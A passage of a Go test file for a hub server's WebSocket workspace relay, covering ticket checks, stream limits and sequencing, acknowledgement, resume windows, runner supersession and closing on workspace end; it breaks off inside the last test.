package hubserver

import (
	"context"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"reflect"
	"slices"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/coder/websocket"
	"github.com/jackc/pgx/v5/multitracer"
	"github.com/jackc/pgx/v5/pgxpool"
	"github.com/labstack/echo/v4"

	"github.com/digitaldrywood/detent/internal/apikey"
	"github.com/digitaldrywood/detent/internal/attachment"
	"github.com/digitaldrywood/detent/internal/auth"
	"github.com/digitaldrywood/detent/internal/hubmaintenance"
	"github.com/digitaldrywood/detent/internal/hubserver/accessstore"
	"github.com/digitaldrywood/detent/internal/hubserver/actionstore"
	"github.com/digitaldrywood/detent/internal/hubserver/claimstore"
	"github.com/digitaldrywood/detent/internal/hubserver/corestore"
	"github.com/digitaldrywood/detent/internal/hubserver/hubapi"
	"github.com/digitaldrywood/detent/internal/hubserver/hubscope"
	"github.com/digitaldrywood/detent/internal/hubserver/leasestore"
	"github.com/digitaldrywood/detent/internal/hubserver/postgres"
	"github.com/digitaldrywood/detent/internal/hubserver/projectstore"
	"github.com/digitaldrywood/detent/internal/hubserver/runnerstore"
	"github.com/digitaldrywood/detent/internal/hubserver/tenantstore"
	"github.com/digitaldrywood/detent/internal/pgtransport"
	"github.com/digitaldrywood/detent/internal/providercapacity"
	"github.com/digitaldrywood/detent/internal/runnerauth"
	"github.com/digitaldrywood/detent/internal/testenv"
	"github.com/digitaldrywood/detent/internal/tracker"
	"github.com/digitaldrywood/detent/internal/workspacesession"
)

// The relay is tested against real WebSocket connections on an httptest server
// rather than by calling the handlers: the whole point of the relay protocol is what
// happens between two sockets -- stream ownership, sequencing, acknowledgement,
// supersession and resume -- and none of that is visible from a handler call.

// relayFixture is a hub with workspace sessions enabled, one issue, one
// enrolled runner that reports the read-only surfaces, and one bound workspace.
type relayFixture struct {
	nativeFixture
	mu        sync.Mutex
	clock     time.Time
	server    *httptest.Server
	runner    runnerFixture
	workspace string
	lease     tracker.NativeLease
	item      string
	// terminal turns the terminal surface on, in the configuration, in what
	// the runner reports and in what the bind carries.
	terminal bool
	// exec turns the exec surface on the same way. It is off by default
	// because exec is a surface a runner has to offer, exactly as the
	// terminal is: a workspace whose runner never reported it must refuse the
	// channel.
	exec bool
	// readOnly binds the workspace read-only, which is what a workspace on a
	// still-running attempt is. It is the state that refuses exec whatever the
	// runner can serve.
	readOnly bool
	// terminalDisabled reports the terminal capability from the runner while
	// leaving workspaces.terminal.enabled off. It is the one shape that
	// separates "this runner cannot serve a terminal" from "this organization
	// has not turned terminals on", which are two different refusals a person
	// has to be able to tell apart.
	terminalDisabled bool
	// noRecording turns workspaces.terminal.record off, which the terminal contract
	// defaults to on.
	noRecording bool
	// git turns the git surface on the same way. It is off by default so the
	// fixture keeps a workspace whose runner never reported the capability,
	// which is what the channelPermitted refusal is tested against.
	git bool
}

// withTerminal is the fixture option that reports and binds the terminal
// surface as well, and turns workspaces.terminal.enabled on. The terminal is
// the only channel that opens a stream per request (one PTY per open,
// the relay protocol), so it is the only one that can reach the per-connection limit.
func withTerminal(fixture *relayFixture) { fixture.terminal = true }

// withTerminalReportedButDisabled reports the terminal capability and leaves
// the setting off, which is the shape a runner that serves terminals has on an
// organization that has not turned them on.
func withTerminalReportedButDisabled(fixture *relayFixture) {
	fixture.terminal = true
	fixture.terminalDisabled = true
}

// withoutRecording turns workspaces.terminal.record off. A terminal with it off
// is still a terminal; it just leaves nothing behind.
func withoutRecording(fixture *relayFixture) { fixture.noRecording = true }

// withExec is the fixture option that reports and binds the exec surface, so
// the workspace may carry project action runs.
func withExec(fixture *relayFixture) { fixture.exec = true }

// withReadOnlyExec reports exec and then holds the workspace read-only, which
// is the shape a workspace opened on a running attempt has.
func withReadOnlyExec(fixture *relayFixture) {
	fixture.exec = true
	fixture.readOnly = true
}

// withGit reports and requires the git capability, so the workspace serves the
// header's git action group. It goes in `requires` as well as
// in the report, because the claim gate matches `requires` against what the
// runner reported and a workspace that only reported it would still be
// dispatchable to a runner that could not serve it.
func withGit(fixture *relayFixture) { fixture.git = true }

func newRelayFixture(t *testing.T, options ...func(*relayFixture)) *relayFixture {
	t.Helper()
	fixture := &relayFixture{clock: time.Now().UTC().Truncate(time.Microsecond)}
	for _, option := range options {
		option(fixture)
	}
	recording := !fixture.noRecording
	f := newDefaultNativeFixture(t, Config{
		Workspace: &WorkspaceConfig{Enabled: true,
			Terminal: WorkspaceTerminalConfig{
				Enabled: fixture.terminal && !fixture.terminalDisabled,
				Record:  &recording,
			}},
		now: func() time.Time {
			fixture.mu.Lock()
			defer fixture.mu.Unlock()
			return fixture.clock
		},
	})
	fixture.nativeFixture = f
	service := f.service
	policy := hubTestPolicy()
	approveHubTestPolicy(t, service, fixture.base+"/policy", policy)
	fixture.server = httptest.NewServer(service.echo)
	t.Cleanup(fixture.server.Close)

	fixture.runner = prepareRunner(t, fixture.nativeFixture, runnerauth.Read, runnerauth.Collaborate,
		runnerauth.Claim, runnerauth.Heartbeat, runnerauth.Events)
	fixture.runner.enroll(t)
	fixture.reportCapabilities(t, fixture.capabilities())

	issue := fixture.create(t, "subject")
	requires := []string{workspacesession.CapabilityFiles}
	if fixture.git {
		requires = append(requires, workspacesession.CapabilityGit)
	}
	fixture.workspace = fixture.open(t, map[string]any{
		"idempotency_key": "ws-1", "work_item_id": string(issue.WorkItemID), "requires": requires,
	})
	fixture.item = fixture.dispatchItem(t)
	fixture.lease = fixture.claim(t)
	fixture.bind(t)
	if fixture.readOnly {
		fixture.markReadOnly(t)
	}
	return fixture
}

// capabilities is what the runner reports and binds with.
func (f *relayFixture) capabilities() workspacesession.Capabilities {
	return workspacesession.Capabilities{
		Files: true, Diff: true, Terminal: f.terminal, Exec: f.exec, Git: f.git,
	}
}

// markReadOnly puts the workspace in the state the workspace session contract gives a workspace
// opened on an attempt that is still running: the person may look at the
// worktree the model is editing and may not type into it.
//
// It writes the column rather than staging a running attempt, because
// read_only is set once at creation and never changed afterwards -- so the row
// this writes is exactly the row the hub would hold, and the alternative would
// be an attempt, a lease and a dispatch to assert one boolean.
func (f *relayFixture) markReadOnly(t *testing.T) {
	t.Helper()
	f.updateWorkspace(t, func(arg *postgres.WorkspaceUpdate) { arg.ReadOnly = true })
}

// record reads the workspace row the relay fences against, for the checks that
// are tested against the database rather than over a socket.
func (f *relayFixture) record(t *testing.T) workspaceRecord {
	t.Helper()
	var row postgres.WorkspaceSession
	if err := f.service.accessRead(t.Context(), f.project.OrganizationID, func(reader tenantstore.Reader) error {
		var err error
		row, err = reader.(postgres.WorkspaceReader).WorkspaceSession(t.Context(), f.project.ID, f.workspace)
		return err
	}); err != nil {
		t.Fatal(err)
	}
	return relayWorkspaceRecord(row)
}

// reportCapabilities is the runner's heartbeat carrying what it can serve for a
// workspace, beside the provider report.
func (f *relayFixture) reportCapabilities(t *testing.T, capabilities workspacesession.Capabilities) {
	t.Helper()
	report := providercapacity.Report{Provider: "openai", Backend: "codex", AccountAlias: "relay",
		Models: []string{"test-model"}, MaxConcurrent: 4, Availability: "available", ObservedAt: f.at()}
	response := performHubAPIRequest(t, f.service, http.MethodPost,
		f.base+"/machines/"+string(f.runner.binding.MachineID)+"/heartbeat", f.runner.redemption.Credential,
		map[string]any{
			"display_name": "runner", "capacity": 8, "version": "test", "backend_isolation": f.runner.redemption.BackendIsolation,
			"provider_reports": []providercapacity.Report{report}, "workspace_capabilities": capabilities,
			"workspace_isolation":    workspacesession.IsolationContainer,
			"capacity_configuration": runnerauth.CapacityConfig{Revision: strings.Repeat("c", 64), LocalLimit: 8, ClientLimit: 8, RuntimeLimit: 8, Manageable: true, ObservedAt: f.at()},
		})
	requireNativeStatus(t, response, http.StatusOK)
}

func (f *relayFixture) at() time.Time {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.clock
}

func (f *relayFixture) advance(d time.Duration) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.clock = f.clock.Add(d)
}

// open requests a workspace and returns its id.
func (f *relayFixture) open(t *testing.T, body map[string]any) string {
	t.Helper()
	response := performHubAPIRequest(t, f.service, http.MethodPost, f.base+"/workspaces", f.token, body)
	requireNativeStatus(t, response, http.StatusCreated)
	var session workspacesession.Session
	decodeHubResponse(t, response, &session)
	return session.ID
}

// dispatchItem is the native issue the hub created to dispatch the workspace.
func (f *relayFixture) dispatchItem(t *testing.T) string {
	t.Helper()
	var page claimstore.CandidatePage
	if err := f.service.accessRead(t.Context(), f.project.OrganizationID, func(reader tenantstore.Reader) error {
		var err error
		page, err = reader.CandidatePage(t.Context(), claimstore.CandidateQuery{ProjectID: f.project.ID, WorkspaceLane: true, AvailableAt: f.at(), Limit: 1})
		return err
	}); err != nil {
		t.Fatal(err)
	}
	if len(page.Items) != 1 {
		t.Fatalf("workspace dispatch candidates=%+v, want one", page.Items)
	}
	return string(page.Items[0].WorkItemID)
}

// claim takes the workspace item's lease for the fixture's runner.
func (f *relayFixture) claim(t *testing.T) tracker.NativeLease {
	t.Helper()
	// Exactly what hubclient.WorkspaceClaimer sends: the workspace capability,
	// which is what the candidate query offers workspace items against,
	// and no local model selection, because a
	// workspace session runs no model.
	response := performHubAPIRequest(t, f.service, http.MethodPost, f.base+"/claims", f.runner.redemption.Credential,
		tracker.NativeClaim{PolicyID: hubTestPolicy().ID, WorkItemID: tracker.NativeWorkItemID(f.item),
			MachineID: f.runner.binding.MachineID, SessionID: "relay-session", TTLSeconds: 90, ProtocolMajor: 2,
			Capabilities: []string{"native_issues", "scoped_collaboration", tracker.NativeWorkspaceCapability}})
	requireNativeStatus(t, response, http.StatusOK)
	var lease tracker.NativeLease
	decodeHubResponse(t, response, &lease)
	return lease
}

// bind takes the workspace to ready, which is the only state the relay serves.
func (f *relayFixture) bind(t *testing.T) {
	t.Helper()
	identity := map[string]any{"lease_id": f.lease.ID, "fencing_token": strconv.FormatInt(int64(f.lease.FencingToken), 10)}
	body := map[string]any{
		"lease_id": identity["lease_id"], "fencing_token": identity["fencing_token"],
		"capabilities": f.capabilities(),
		"isolation":    workspacesession.IsolationContainer,
	}
	response := performHubAPIRequest(t, f.service, http.MethodPost,
		f.base+"/workspaces/"+f.workspace+"/worker/bind", f.runner.redemption.Credential, body)
	requireNativeStatus(t, response, http.StatusOK)
	body["state"] = workspacesession.StateReady
	body["head_sha"] = "abc123"
	response = performHubAPIRequest(t, f.service, http.MethodPost,
		f.base+"/workspaces/"+f.workspace+"/worker/heartbeat", f.runner.redemption.Credential, body)
	requireNativeStatus(t, response, http.StatusOK)
}

// ticket mints a relay ticket for the operator token.
func (f *relayFixture) ticket(t *testing.T) string {
	t.Helper()
	response := performHubAPIRequest(t, f.service, http.MethodPost,
		f.base+"/workspaces/"+f.workspace+"/relay-tickets", f.token, map[string]any{})
	requireNativeStatus(t, response, http.StatusCreated)
	var minted workspaceRelayTicketResponse
	decodeHubResponse(t, response, &minted)
	return minted.Ticket
}

// socketURL turns a hub path into the websocket URL of the test server.
func (f *relayFixture) socketURL(path string) string {
	return "ws" + strings.TrimPrefix(f.server.URL, "http") + path
}

// dialPerson opens a person connection with a fresh ticket.
func (f *relayFixture) dialPerson(t *testing.T) *relayClient {
	t.Helper()
	ticket := f.ticket(t)
	url := f.socketURL(f.base + "/workspaces/" + f.workspace + "/relay?ticket=" + ticket)
	before := f.attachedConnections()
	client := f.dial(t, url, http.Header{"Authorization": {"Bearer " + f.token}})
	f.awaitAttached(t, before)
	return client
}

// dialRunner opens the workspace's runner connection.
func (f *relayFixture) dialRunner(t *testing.T) *relayClient {
	t.Helper()
	url := f.socketURL(f.base + "/workspaces/" + f.workspace + "/worker/relay")
	before := f.attachedConnections()
	client := f.dial(t, url, http.Header{
		"Authorization":          {"Bearer " + f.runner.redemption.Credential},
		"X-Detent-Lease":         {string(f.lease.ID)},
		"X-Detent-Fencing-Token": {strconv.FormatInt(int64(f.lease.FencingToken), 10)},
	})
	f.awaitAttached(t, before)
	return client
}

// attachedConnections reports how many connections have ever joined the relay.
func (f *relayFixture) attachedConnections() uint64 {
	return f.service.workspaces.relay.Attachments()
}

// awaitAttached waits until the relay has registered a connection since
// before was read. A dial returns once the upgrade completes, which is before
// the hub registers the connection, so a test that acts straight after a dial
// would otherwise race the registration: a frame sent to a runner not yet
// attached is answered "no runner", and a workspace closed before a person
// attached never reaches that person. The counter only rises, so a connection
// that joined and was closed again is still seen.
func (f *relayFixture) awaitAttached(t *testing.T, before uint64) {
	t.Helper()
	testenv.WaitUntil(t, t.Context(), func() error {
		if f.attachedConnections() <= before {
			return errors.New("the dialled connection never joined the relay")
		}
		return nil
	})
}

// advanceServing moves the clock forward with the runner still heartbeating,
// which is what a live runner does while a person's tab is closed. Moving the
// clock alone would let the next maintenance sweep find two missed heartbeats
// and mark the workspace unreachable, closing every connection on it.
func (f *relayFixture) advanceServing(t *testing.T, d time.Duration) {
	t.Helper()
	f.advance(d)
	f.updateWorkspace(t, func(arg *postgres.WorkspaceUpdate) { arg.LastHeartbeatAt = new(f.at()) })
}

func (f *relayFixture) dial(t *testing.T, url string, header http.Header) *relayClient {
	t.Helper()
	ctx := testenv.WaitContext(t, t.Context())
	socket, response, err := websocket.Dial(ctx, url, &websocket.DialOptions{HTTPHeader: header})
	closeRelayDial(response)
	if err != nil {
		t.Fatalf("dial %s: %v", url, err)
	}
	socket.SetReadLimit(relayReadLimit)
	client := &relayClient{t: t, socket: socket}
	t.Cleanup(func() { _ = socket.Close(websocket.StatusNormalClosure, "test over") })
	return client
}

// relayClient is one side of a relay conversation in a test.
type relayClient struct {
	t      *testing.T
	socket *websocket.Conn
}

func (c *relayClient) send(frame workspacesession.Frame) {
	c.t.Helper()
	encoded, err := json.Marshal(frame)
	if err != nil {
		c.t.Fatal(err)
	}
	ctx := testenv.WaitContext(c.t, c.t.Context())
	if err := c.socket.Write(ctx, websocket.MessageText, encoded); err != nil {
		c.t.Fatalf("write frame: %v", err)
	}
}

// receive reads the next frame, failing the test rather than hanging when none
// arrives: a relay bug shows up as silence, and a test that hangs on silence
// tells nobody which frame went missing.
func (c *relayClient) receive() workspacesession.Frame {
	c.t.Helper()
	ctx := testenv.WaitContext(c.t, c.t.Context())
	kind, data, err := c.socket.Read(ctx)
	if err != nil {
		c.t.Fatalf("read frame: %v", err)
	}
	if kind != websocket.MessageText {
		c.t.Fatalf("frame message type = %v, want text", kind)
	}
	var frame workspacesession.Frame
	if err := json.Unmarshal(data, &frame); err != nil {
		c.t.Fatalf("decode frame %q: %v", data, err)
	}
	return frame
}

// expectClosed asserts the socket ends rather than delivering another frame.
func (c *relayClient) expectClosed() {
	c.t.Helper()
	ctx := testenv.WaitContext(c.t, c.t.Context())
	for {
		kind, data, err := c.socket.Read(ctx)
		if err != nil {
			return
		}
		// A close is announced with an error frame before the socket ends, so
		// one more frame is expected; anything after it is not.
		if kind == websocket.MessageText && json.Valid(data) {
			continue
		}
		c.t.Fatalf("expected the socket to close, read %q", data)
	}
}

func filesListFrame(path string) workspacesession.Frame {
	payload, err := workspacesession.Encode(workspacesession.FilesRequest{Path: path})
	if err != nil {
		panic(err)
	}
	return workspacesession.Frame{Channel: workspacesession.ChannelFiles, Type: workspacesession.TypeFilesList, Payload: payload}
}

func TestWorkspaceRelayForwardsAFilesRequestAndItsAnswer(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	person.send(filesListFrame("internal"))
	forwarded := runner.receive()
	if forwarded.Channel != workspacesession.ChannelFiles || forwarded.Type != workspacesession.TypeFilesList {
		t.Fatalf("runner received %+v", forwarded)
	}
	// The hub allocates the stream, so the person never chooses an id and a
	// second tab cannot name the first one's stream.
	connection, index, err := workspacesession.ParseStreamID(forwarded.Stream)
	if err != nil || index != 1 || connection == "" {
		t.Fatalf("stream id %q: %v", forwarded.Stream, err)
	}
	if forwarded.Seq != 1 {
		t.Fatalf("runner-bound seq = %d, want 1", forwarded.Seq)
	}
	// The actor is stamped by the hub and never supplied by the client, which
	// is what lets a runner audit what it was asked to do and by whom.
	if forwarded.Actor == nil || forwarded.Actor.PrincipalID == "" || forwarded.Actor.ConnectionID != connection {
		t.Fatalf("actor = %+v, want the hub's stamp for connection %q", forwarded.Actor, connection)
	}

	listed, err := workspacesession.Encode(workspacesession.FilesListed{Path: "internal", Entries: []workspacesession.FilesEntry{{Name: "hubserver", Kind: workspacesession.KindDir}}})
	if err != nil {
		t.Fatal(err)
	}
	runner.send(workspacesession.Frame{Channel: workspacesession.ChannelFiles, Stream: forwarded.Stream, Type: workspacesession.TypeFilesListed, Payload: listed})
	answer := person.receive()
	if answer.Type != workspacesession.TypeFilesListed || answer.Stream != forwarded.Stream || answer.Seq != 1 {
		t.Fatalf("person received %+v", answer)
	}
	// The runner never sees the hub's actor stamp echoed back at the person:
	// it is the hub's own annotation on the runner-bound copy.
	if answer.Actor != nil {
		t.Fatalf("person-bound frame carried an actor: %+v", answer.Actor)
	}
}

func TestWorkspaceRelayAcknowledgementReleasesTheReplayBuffer(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	person.send(filesListFrame(""))
	forwarded := runner.receive()

	payload, err := workspacesession.Encode(workspacesession.FilesListed{Path: ""})
	if err != nil {
		t.Fatal(err)
	}
	runner.send(workspacesession.Frame{Channel: workspacesession.ChannelFiles, Stream: forwarded.Stream, Type: workspacesession.TypeFilesListed, Payload: payload})
	answer := person.receive()

	before := f.service.workspaces.relay.memoryUsed()
	if before == 0 {
		t.Fatal("an unacknowledged frame must be buffered for replay")
	}
	ack, err := workspacesession.Encode(workspacesession.AckPayload{Through: answer.Seq})
	if err != nil {
		t.Fatal(err)
	}
	person.send(workspacesession.Frame{Channel: workspacesession.ChannelFiles, Stream: forwarded.Stream, Type: workspacesession.TypeAck, Payload: ack})
	// The ack is processed on the hub's read loop, so the release is observed
	// rather than assumed: a poll here is the only honest way to wait for
	// another goroutine's effect.
	waitFor(t, func() bool { return f.service.workspaces.relay.memoryUsed() < before })
}

// waitFor polls a condition until it holds or the test times out. The relay's
// effects happen on its own goroutines, so a test that asserted immediately
// would be asserting on a race rather than on behaviour.
func waitFor(t *testing.T, condition func() bool) {
	t.Helper()
	testenv.WaitUntil(t, t.Context(), func() error {
		if condition() {
			return nil
		}
		return errors.New("the condition did not hold before the deadline")
	})
}

func TestWorkspaceRelayRefusesASecondUseOfATicket(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	ticket := f.ticket(t)
	url := f.socketURL(f.base + "/workspaces/" + f.workspace + "/relay?ticket=" + ticket)
	header := http.Header{"Authorization": {"Bearer " + f.token}}
	first := f.dial(t, url, header)
	_ = first
	ctx := testenv.WaitContext(t, t.Context())
	refused, response, err := websocket.Dial(ctx, url, &websocket.DialOptions{HTTPHeader: header})
	closeRelayDial(response)
	if err == nil {
		_ = refused.Close(websocket.StatusNormalClosure, "unexpected")
		t.Fatal("a ticket is single use; the second connection must be refused")
	}
}

func TestWorkspaceRelayRefusesAnExpiredTicket(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	ticket := f.ticket(t)
	f.advance(workspacesession.TicketLifetime + time.Second)
	url := f.socketURL(f.base + "/workspaces/" + f.workspace + "/relay?ticket=" + ticket)
	ctx := testenv.WaitContext(t, t.Context())
	refused, response, err := websocket.Dial(ctx, url, &websocket.DialOptions{
		HTTPHeader: http.Header{"Authorization": {"Bearer " + f.token}},
	})
	closeRelayDial(response)
	if err == nil {
		_ = refused.Close(websocket.StatusNormalClosure, "unexpected")
		t.Fatal("a ticket is worth 30 seconds; an expired one must be refused")
	}
}

func TestWorkspaceRelayRefusesAnUpgradeWithoutATicket(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	ctx := testenv.WaitContext(t, t.Context())
	refused, response, err := websocket.Dial(ctx, f.socketURL(f.base+"/workspaces/"+f.workspace+"/relay"), &websocket.DialOptions{
		HTTPHeader: http.Header{"Authorization": {"Bearer " + f.token}},
	})
	closeRelayDial(response)
	if err == nil {
		_ = refused.Close(websocket.StatusNormalClosure, "unexpected")
		t.Fatal("the upgrade carries no CSRF header, so a ticket is the only credential that may open it")
	}
}

func TestWorkspaceRelaySupersedesASecondRunnerConnection(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	first := f.dialRunner(t)
	second := f.dialRunner(t)

	// Two runners answering one workspace would each be serving a different
	// worktree, so the older connection is told exactly why it lost it.
	notice := first.receive()
	var payload workspacesession.ErrorPayload
	if err := json.Unmarshal(notice.Payload, &payload); err != nil {
		t.Fatal(err)
	}
	if payload.Code != workspacesession.CodeSuperseded {
		t.Fatalf("first runner received %+v, want superseded", payload)
	}
	first.expectClosed()

	person := f.dialPerson(t)
	person.send(filesListFrame(""))
	if forwarded := second.receive(); forwarded.Type != workspacesession.TypeFilesList {
		t.Fatalf("the surviving runner received %+v", forwarded)
	}
}

func TestWorkspaceRelayAnswersAnUnknownChannelWithoutClosingTheSocket(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	person.send(workspacesession.Frame{Channel: "agents", Type: "open"})
	answer := person.receive()
	var payload workspacesession.ErrorPayload
	if err := json.Unmarshal(answer.Payload, &payload); err != nil {
		t.Fatal(err)
	}
	if payload.Code != workspacesession.CodeInvalidFrame {
		t.Fatalf("unknown channel answered %+v", payload)
	}
	// A client bug on one frame must not cost a person their session, so the
	// next legal frame still reaches the runner.
	person.send(filesListFrame(""))
	if forwarded := runner.receive(); forwarded.Type != workspacesession.TypeFilesList {
		t.Fatalf("the connection did not survive one bad frame: %+v", forwarded)
	}
}

func TestWorkspaceRelayRefusesAChannelTheWorkspaceDoesNotServe(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	f.dialRunner(t)
	person := f.dialPerson(t)

	// The runner reported files and diff; a terminal is neither offered by
	// the runner nor enabled for the organization, so the channel is refused
	// rather than forwarded to a runner that cannot serve it.
	person.send(workspacesession.Frame{Channel: workspacesession.ChannelTerminal, Type: workspacesession.TypeOpen})
	answer := person.receive()
	var payload workspacesession.ErrorPayload
	if err := json.Unmarshal(answer.Payload, &payload); err != nil {
		t.Fatal(err)
	}
	if payload.Code != workspacesession.CodeForbidden {
		t.Fatalf("terminal channel answered %+v, want forbidden", payload)
	}
}

// terminalOpenFrame is a person's `open` on the terminal channel. The relay protocol
// gives every open its own PTY, so each one is a stream of its own.
func terminalOpenFrame() workspacesession.Frame {
	payload, err := workspacesession.Encode(map[string]any{"cols": 80, "rows": 24})
	if err != nil {
		panic(err)
	}
	return workspacesession.Frame{Channel: workspacesession.ChannelTerminal, Type: workspacesession.TypeOpen, Payload: payload}
}

// errorPayload decodes an error frame, failing the test when the frame is
// something else: a test that reads "want stream_limit" out of a `listed` is
// reporting the wrong thing.
func errorPayload(t *testing.T, frame workspacesession.Frame) workspacesession.ErrorPayload {
	t.Helper()
	if frame.Type != workspacesession.TypeError {
		t.Fatalf("frame %+v is not an error", frame)
	}
	var payload workspacesession.ErrorPayload
	if err := json.Unmarshal(frame.Payload, &payload); err != nil {
		t.Fatal(err)
	}
	return payload
}

func TestWorkspaceRelayEnforcesThePerConnectionStreamLimit(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withTerminal)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	// A terminal opens explicitly and every open is its own PTY, so this is
	// the channel the per-connection limit is actually about.
	for index := range workspacesession.MaxStreamsPerConnection {
		person.send(terminalOpenFrame())
		if forwarded := runner.receive(); forwarded.Type != workspacesession.TypeOpen {
			t.Fatalf("stream %d was not forwarded: %+v", index, forwarded)
		}
	}
	person.send(terminalOpenFrame())
	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeStreamLimit {
		t.Fatalf("the ninth stream answered %+v, want stream_limit", payload)
	}
}

// The sixth dogfood run's stream-accounting defect, in both halves.
//
// A Files client that never names a stream is not asking for a new one: the
// channel is request/response and the connection has one conversation on it.
// The hub used to allocate per request, so the ninth listing on a connection
// was refused with stream_limit and the connection could never list again.
func TestWorkspaceRelayReusesAStreamlessRequestChannelStream(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	// One more round than the per-connection limit, every one of them sent the
	// way the dogfood client sent them: no stream field at all.
	rounds := workspacesession.MaxStreamsPerConnection + 1
	first := ""
	for round := range rounds {
		person.send(filesListFrame("."))
		forwarded := runner.receive()
		if forwarded.Type != workspacesession.TypeFilesList {
			t.Fatalf("round %d answered %+v, want the list forwarded", round+1, forwarded)
		}
		if first == "" {
			first = forwarded.Stream
		}
		if forwarded.Stream != first {
			t.Fatalf("round %d ran on stream %q, want %q", round+1, forwarded.Stream, first)
		}
		// seq is per stream per direction from 1, so a reused stream counts up
		// rather than restarting.
		if forwarded.Seq != int64(round+1) {
			t.Fatalf("round %d had seq %d, want %d", round+1, forwarded.Seq, round+1)
		}
	}
	if _, index, err := workspacesession.ParseStreamID(first); err != nil || index != 1 {
		t.Fatalf("stream id %q: %v", first, err)
	}
}

// A close gives the slot back. Without that the count that refuses the next
// stream is describing streams nobody holds.
func TestWorkspaceRelayReclaimsAClosedStreamTowardTheLimit(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withTerminal)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	opened := make([]string, 0, workspacesession.MaxStreamsPerConnection)
	for range workspacesession.MaxStreamsPerConnection {
		person.send(terminalOpenFrame())
		opened = append(opened, runner.receive().Stream)
	}
	person.send(terminalOpenFrame())
	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeStreamLimit {
		t.Fatalf("the ninth open answered %+v, want stream_limit", payload)
	}

	person.send(workspacesession.Frame{Channel: workspacesession.ChannelTerminal, Stream: opened[0], Type: workspacesession.TypeClose})
	if answer := person.receive(); answer.Type != workspacesession.TypeClosed || answer.Stream != opened[0] {
		t.Fatalf("close answered %+v, want closed on %q", answer, opened[0])
	}
	if forwarded := runner.receive(); forwarded.Type != workspacesession.TypeClose {
		t.Fatalf("the runner was not told to close: %+v", forwarded)
	}

	// The freed slot is usable, and it is a new stream rather than the closed
	// id handed out a second time.
	person.send(terminalOpenFrame())
	forwarded := runner.receive()
	if forwarded.Type != workspacesession.TypeOpen {
		t.Fatalf("the open after a close answered %+v", forwarded)
	}
	if slices.Contains(opened, forwarded.Stream) {
		t.Fatalf("stream %q reuses an id already handed out: %v", forwarded.Stream, opened)
	}
}

func TestWorkspaceRelayResumesAStreamWithinTheWindow(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	person.send(filesListFrame(""))
	forwarded := runner.receive()

	// The runner answers while the person is away, so the frame is buffered
	// for the 60 seconds the relay protocol gives them to come back.
	_ = person.socket.Close(websocket.StatusNormalClosure, "tab closed")
	waitFor(t, func() bool { return f.service.workspaces.relay.detachedCount(f.workspace) == 1 })
	payload, err := workspacesession.Encode(workspacesession.FilesListed{Path: "internal"})
	if err != nil {
		t.Fatal(err)
	}
	runner.send(workspacesession.Frame{Channel: workspacesession.ChannelFiles, Stream: forwarded.Stream, Type: workspacesession.TypeFilesListed, Payload: payload})

	resumed := f.dialPerson(t)
	request, err := workspacesession.Encode(workspacesession.ResumePayload{Stream: forwarded.Stream, LastSeq: 0})
	if err != nil {
		t.Fatal(err)
	}
	resumed.send(workspacesession.Frame{Channel: workspacesession.ChannelFiles, Type: workspacesession.TypeResume, Payload: request})
	if answer := resumed.receive(); answer.Type != workspacesession.TypeResumed {
		t.Fatalf("resume answered %+v", answer)
	}
	replay := resumed.receive()
	if replay.Type != workspacesession.TypeFilesListed || replay.Stream != forwarded.Stream {
		t.Fatalf("replay = %+v, want the buffered answer", replay)
	}
}

func TestWorkspaceRelayRefusesAResumePastTheWindow(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	person.send(filesListFrame(""))
	forwarded := runner.receive()
	_ = person.socket.Close(websocket.StatusNormalClosure, "tab closed")
	waitFor(t, func() bool { return f.service.workspaces.relay.detachedCount(f.workspace) == 1 })

	f.advanceServing(t, workspacesession.ResumeWindow+time.Second)
	resumed := f.dialPerson(t)
	request, err := workspacesession.Encode(workspacesession.ResumePayload{Stream: forwarded.Stream, LastSeq: 0})
	if err != nil {
		t.Fatal(err)
	}
	resumed.send(workspacesession.Frame{Channel: workspacesession.ChannelFiles, Type: workspacesession.TypeResume, Payload: request})
	answer := resumed.receive()
	var payload workspacesession.ErrorPayload
	if err := json.Unmarshal(answer.Payload, &payload); err != nil {
		t.Fatal(err)
	}
	if payload.Code != workspacesession.CodeResumeFailed {
		t.Fatalf("a resume past the window answered %+v, want resume_failed", payload)
	}
}

func TestWorkspaceRelayClosesEveryConnectionWhenTheWorkspaceEnds(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	response := performHubAPIRequest(t, f.service, http.MethodDelete, f.base+"/workspaces/"+f.workspace, f.token, nil)
	requireNativeStatus(t, response, http.StatusNoContent)
	for _, client := range []*relayClient{person, runner} {
		notice := client.receive()
		var payload workspacesession.ErrorPayload
		if err := json.Unmarshal(notice.Payload, &payload); err != nil {
			t.Fatal(err)
		}
		if payload.Code != workspacesession.CodeWorkspaceClosed {
			t.Fatalf("close notice = %+v, want workspace_closed", payload)
		}
		client.expectClosed()
	}
}

func TestWorkspaceRelayTellsAPersonWhenNoRunnerIsServing(t *testing.T) {
	t.Parallel()
